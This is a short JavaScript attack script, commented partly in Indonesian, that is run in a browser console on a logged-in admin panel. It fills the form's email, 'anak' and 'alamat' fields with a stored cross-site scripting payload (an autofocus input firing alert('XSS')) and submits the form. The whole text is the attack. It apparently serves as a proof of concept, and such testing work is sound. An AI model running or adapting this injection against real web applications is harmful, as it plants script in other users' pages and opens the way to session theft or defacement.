
// XSS Injection Script
// Run this in browser console saat sudah login ke admin panel

function injectPayload() {
    // Fill form dengan payload
    document.getElementById('email').value = `<input onfocus=alert("XSS") autofocus>`;
    document.getElementById('anak').value = `<input onfocus=alert("XSS") autofocus>`;
    document.getElementById('alamat').value = `<input onfocus=alert("XSS") autofocus>`;
    
    // Submit form
    document.getElementById('myForm').submit();
    
    console.log('[+] Payload injected!');
}

// Execute
injectPayload();
